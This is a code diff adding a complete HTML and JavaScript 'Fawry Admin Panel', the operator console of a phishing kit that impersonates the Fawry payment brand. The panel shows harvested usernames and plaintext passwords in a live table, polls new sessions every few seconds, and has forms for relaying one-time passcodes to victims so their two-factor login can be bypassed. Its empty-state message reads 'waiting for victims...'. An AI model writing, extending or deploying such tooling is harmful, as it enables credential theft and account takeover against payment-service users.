@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fawry Admin Panel</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --purple:#6B1FA8;--purple-dark:#3D0A6B;--purple-light:#A870D4;
+  --bg:#0D0D1A;--card:#15152A;--border:#2A2A4A;
+  --text:#E8E8FF;--muted:#8888AA;
+  --green:#22C55E;--yellow:#EAB308;--red:#EF4444;--blue:#3B82F6;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;min-height:100vh}
+
+/* ── TOP BAR ── */
+.topbar{
+  background:linear-gradient(90deg,var(--purple-dark),var(--purple));
+  padding:0 24px;height:58px;
+  display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:100;
+  box-shadow:0 2px 16px rgba(0,0,0,0.4);
+}
+.topbar h1{font-size:18px;font-weight:700;letter-spacing:1px;color:#fff}
+.topbar-right{display:flex;align-items:center;gap:12px}
+.badge{padding:4px 10px;border-radius:20px;font-size:12px;font-weight:600}
+.badge.online{background:rgba(34,197,94,.15);border:1px solid var(--green);color:var(--green)}
+.badge.count{background:rgba(168,112,212,.15);border:1px solid var(--purple-light);color:var(--purple-light)}
+
+/* ── LOGIN GATE ── */
+#login-gate{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  min-height:100vh;gap:16px;
+}
+#login-gate h2{font-size:22px;color:var(--purple-light)}
+#login-gate input{
+  padding:12px 16px;background:var(--card);border:1.5px solid var(--border);
+  border-radius:10px;color:var(--text);font-size:15px;width:280px;outline:none;
+}
+#login-gate input:focus{border-color:var(--purple-light)}
+#login-gate button{
+  padding:12px 32px;background:var(--purple);border:none;border-radius:10px;
+  color:#fff;font-size:15px;font-weight:700;cursor:pointer;width:280px;
+}
+#login-gate button:hover{background:var(--purple-light)}
+.err{color:var(--red);font-size:13px;display:none}
+.err.show{display:block}
+
+/* ── MAIN ── */
+#main{display:none;padding:20px 16px}
+
+/* ── STATS ROW ── */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:20px}
+.stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px 16px;text-align:center}
+.stat-val{font-size:26px;font-weight:800;margin-bottom:4px}
+.stat-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
+
+/* ── TOOLBAR ── */
+.toolbar{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-bottom:14px}
+.toolbar h2{font-size:16px;font-weight:700;color:var(--purple-light)}
+.toolbar-right{display:flex;gap:8px}
+.btn{padding:8px 14px;border-radius:8px;border:none;font-size:13px;font-weight:600;cursor:pointer;transition:filter .2s}
+.btn:hover{filter:brightness(1.12)}
+.btn-refresh{background:var(--purple);color:#fff}
+.btn-clear{background:rgba(239,68,68,.15);border:1px solid var(--red);color:var(--red)}
+.auto-tag{font-size:12px;color:var(--muted)}
+
+/* ── TABLE ── */
+.table-wrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse;min-width:700px}
+thead tr{background:rgba(107,31,168,.2)}
+th{padding:10px 12px;text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);border-bottom:1px solid var(--border)}
+td{padding:11px 12px;font-size:14px;border-bottom:1px solid var(--border);vertical-align:middle}
+tr:hover td{background:rgba(107,31,168,.06)}
+
+.mono{font-family:'Courier New',monospace;font-size:13px}
+.sid{font-size:11px;color:var(--muted);font-family:'Courier New',monospace}
+
+/* status badges */
+.status{padding:3px 10px;border-radius:12px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.s-waiting{background:rgba(234,179,8,.1);border:1px solid var(--yellow);color:var(--yellow)}
+.s-otp_sent{background:rgba(59,130,246,.1);border:1px solid var(--blue);color:var(--blue)}
+.s-otp_received{background:rgba(34,197,94,.1);border:1px solid var(--green);color:var(--green)}
+
+/* OTP send form inline */
+.otp-form{display:flex;gap:6px;align-items:center}
+.otp-form input{
+  width:90px;padding:7px 10px;
+  background:#1A1A30;border:1px solid var(--border);border-radius:6px;
+  color:var(--text);font-size:14px;font-weight:700;outline:none;
+  font-family:'Courier New',monospace;text-align:center;
+}
+.otp-form input:focus{border-color:var(--purple-light)}
+.btn-send{padding:7px 12px;background:var(--purple);color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer}
+.btn-send:hover{background:var(--purple-light)}
+.btn-del{padding:7px 10px;background:rgba(239,68,68,.1);border:1px solid var(--red);color:var(--red);border-radius:6px;font-size:12px;cursor:pointer}
+
+.user-otp{font-weight:800;font-family:'Courier New',monospace;color:var(--green);font-size:16px}
+.no-otp{color:var(--muted);font-size:12px}
+
+.empty{text-align:center;padding:40px;color:var(--muted);font-size:14px}
+.toast{
+  position:fixed;bottom:24px;right:24px;
+  padding:12px 20px;border-radius:10px;font-size:14px;font-weight:600;
+  background:var(--green);color:#fff;
+  transform:translateY(80px);opacity:0;
+  transition:all .3s;z-index:999;
+}
+.toast.show{transform:translateY(0);opacity:1}
+</style>
+</head>
+<body>
+
+<!-- ── LOGIN GATE ── -->
+<div id="login-gate">
+  <h2>🔐 Admin Panel</h2>
+  <input type="password" id="key-input" placeholder="Enter admin key" onkeydown="if(event.key==='Enter')login()">
+  <button onclick="login()">Access Panel</button>
+  <span class="err" id="key-err">Wrong key, try again</span>
+</div>
+
+<!-- ── TOPBAR ── -->
+<div class="topbar" style="display:none" id="topbar">
+  <h1>⚡ Fawry Admin Panel</h1>
+  <div class="topbar-right">
+    <span class="badge online">● LIVE</span>
+    <span class="badge count" id="count-badge">0 sessions</span>
+  </div>
+</div>
+
+<!-- ── MAIN ── -->
+<div id="main">
+  <div class="stats">
+    <div class="stat"><div class="stat-val" id="s-total" style="color:var(--purple-light)">0</div><div class="stat-lbl">Total</div></div>
+    <div class="stat"><div class="stat-val" id="s-waiting" style="color:var(--yellow)">0</div><div class="stat-lbl">Waiting</div></div>
+    <div class="stat"><div class="stat-val" id="s-sent" style="color:var(--blue)">0</div><div class="stat-lbl">OTP Sent</div></div>
+    <div class="stat"><div class="stat-val" id="s-done" style="color:var(--green)">0</div><div class="stat-lbl">OTP Received</div></div>
+  </div>
+
+  <div class="toolbar">
+    <h2>Sessions</h2>
+    <div class="toolbar-right">
+      <span class="auto-tag" id="auto-tag">Auto-refresh: ON</span>
+      <button class="btn btn-refresh" onclick="loadSessions()">↻ Refresh</button>
+      <button class="btn btn-clear" onclick="clearAll()">🗑 Clear All</button>
+    </div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Time</th>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Status</th>
+          <th>Send OTP</th>
+          <th>User Entered</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+let ADMIN_KEY = '';
+let autoInterval = null;
+
+function login(){
+  const k = document.getElementById('key-input').value.trim();
+  if(!k){ document.getElementById('key-err').classList.add('show'); return; }
+  ADMIN_KEY = k;
+  // try fetching to verify
+  fetch('/admin/sessions',{headers:{'x-admin-key':ADMIN_KEY}})
+    .then(r=>{
+      if(r.status===401){ document.getElementById('key-err').classList.add('show'); ADMIN_KEY=''; return; }
+      document.getElementById('login-gate').style.display='none';
+      document.getElementById('topbar').style.display='flex';
+      document.getElementById('main').style.display='block';
+      loadSessions();
+      autoInterval = setInterval(loadSessions, 4000);
+    })
+    .catch(()=>{ document.getElementById('key-err').classList.add('show'); });
+}
+
+async function loadSessions(){
+  try{
+    const r = await fetch('/admin/sessions',{headers:{'x-admin-key':ADMIN_KEY}});
+    if(!r.ok) return;
+    const data = await r.json();
+    renderTable(data);
+  }catch(e){}
+}
+
+function renderTable(sessions){
+  const total = sessions.length;
+  const waiting = sessions.filter(s=>s.status==='waiting').length;
+  const sent = sessions.filter(s=>s.status==='otp_sent').length;
+  const done = sessions.filter(s=>s.status==='otp_received').length;
+
+  document.getElementById('s-total').textContent = total;
+  document.getElementById('s-waiting').textContent = waiting;
+  document.getElementById('s-sent').textContent = sent;
+  document.getElementById('s-done').textContent = done;
+  document.getElementById('count-badge').textContent = total+' session'+(total!==1?'s':'');
+
+  const tbody = document.getElementById('tbody');
+  if(!sessions.length){
+    tbody.innerHTML = '<tr><td colspan="8" class="empty">No sessions yet — waiting for victims...</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = sessions.map((s,i)=>{
+    const t = new Date(s.time).toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+    const d = new Date(s.time).toLocaleDateString('en-GB',{day:'2-digit',month:'2-digit'});
+    const statusClass = {waiting:'s-waiting',otp_sent:'s-otp_sent',otp_received:'s-otp_received'}[s.status]||'s-waiting';
+    const statusLabel = {waiting:'WAITING',otp_sent:'OTP SENT',otp_received:'RECEIVED'}[s.status]||s.status;
+
+    const sendForm = s.status !== 'otp_received' ? `
+      <div class="otp-form">
+        <input type="text" id="otp-${s.sessionId}" inputmode="numeric" maxlength="6" placeholder="6 digits">
+        <button class="btn-send" onclick="sendOtp('${s.sessionId}')">SEND</button>
+      </div>` : `<span style="color:var(--muted);font-size:12px">— done —</span>`;
+
+    const userOtp = s.userOtp
+      ? `<span class="user-otp">${s.userOtp}</span>`
+      : `<span class="no-otp">—</span>`;
+
+    return `<tr>
+      <td class="muted" style="color:var(--muted)">${i+1}</td>
+      <td><div style="font-size:13px">${t}</div><div class="sid">${d}</div></td>
+      <td class="mono" style="color:#FFD700;font-size:15px;font-weight:800">${s.username}</td>
+      <td class="mono" style="color:#FF8C69;font-size:15px;font-weight:800">${s.password}</td>
+      <td><span class="status ${statusClass}">${statusLabel}</span></td>
+      <td>${sendForm}</td>
+      <td>${userOtp}</td>
+      <td><button class="btn-del" onclick="deleteSession('${s.sessionId}')">✕</button></td>
+    </tr>`;
+  }).join('');
+}
+
+async function sendOtp(sessionId){
+  const input = document.getElementById('otp-'+sessionId);
+  const otp = input.value.trim();
+  if(!otp){ input.style.borderColor='var(--red)'; setTimeout(()=>input.style.borderColor='',1000); return; }
+  try{
+    const r = await fetch('/admin/send-otp',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','x-admin-key':ADMIN_KEY},
+      body:JSON.stringify({sessionId,otp})
+    });
+    if(r.ok){ showToast('✓ OTP sent: '+otp); loadSessions(); }
+  }catch(e){}
+}
+
+async function deleteSession(sessionId){
+  try{
+    await fetch('/admin/sessions/'+sessionId,{method:'DELETE',headers:{'x-admin-key':ADMIN_KEY}});
+    loadSessions();
+  }catch(e){}
+}
+
+async function clearAll(){
+  if(!confirm('Delete ALL sessions?')) return;
+  try{
+    await fetch('/admin/sessions',{method:'DELETE',headers:{'x-admin-key':ADMIN_KEY}});
+    loadSessions();
+    showToast('All sessions cleared');
+  }catch(e){}
+}
+
+function showToast(msg){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2500);
+}
+</script>
+</body>
+</html>
